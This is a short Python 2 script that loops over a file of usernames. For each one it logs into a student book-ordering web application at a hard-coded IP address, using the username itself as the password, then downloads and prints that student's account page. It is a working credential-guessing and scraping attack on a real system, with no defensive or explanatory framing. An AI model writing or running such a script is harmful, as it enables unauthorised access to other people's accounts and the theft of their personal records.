import urllib,urllib2,cookielib
import re
import BeautifulSoup
f = open("/home/quake0day/collect/dd","r")
username = f.readline().rstrip()
while username != '':
	a = cookielib.CookieJar()
	b = urllib2.build_opener(urllib2.HTTPCookieProcessor(a))
	urllib2.install_opener(b)
	dust1 = 'http://211.82.90.56:8080/caubook/TeacherLog.aspx?__VIEWSTATE=%2FwEPDwUKMTk4Njc5NTU4Mg9kFgICAw9kFgICBw8PZBYCHgdvbmNsaWNrBSdpZih0aGlzLmRpc2FibGVkPT1mYWxzZSl7cmV0dXJuICBiYygpO31kZP%2B9YQS1SQoVhX0gctevArgHvY9U&Tbusername='
	dust2 = username
	dust3 = '&Tbuserpwd='
	dust4 = username
	dust5 = '&RadioButtonList1=%E5%AD%A6%E7%94%9F&Button1=%E7%A1%AE%E8%AE%A4&__EVENTVALIDATION=%2FwEWBwKZqo6EDgKS6L7%2FCwK1gprrAQLo4%2BrNDQLN7c0VAveMotMNAoznisYGXMvRojLDcm7L2wkg34m0QFH3k5c%3D'
	response=urllib2.urlopen(dust1+dust2+dust3+dust4+dust5)
	next = urllib2.urlopen('http://211.82.90.56:8080/caubook/Student/StuAna1.aspx')
	txt = BeautifulSoup(next.read())
	#print next.read()
	#txt = next.read()
	#txt = re.compile(r'<[^>]+>').sub('',txt)
	print txt
	username = f.readline().rstrip()
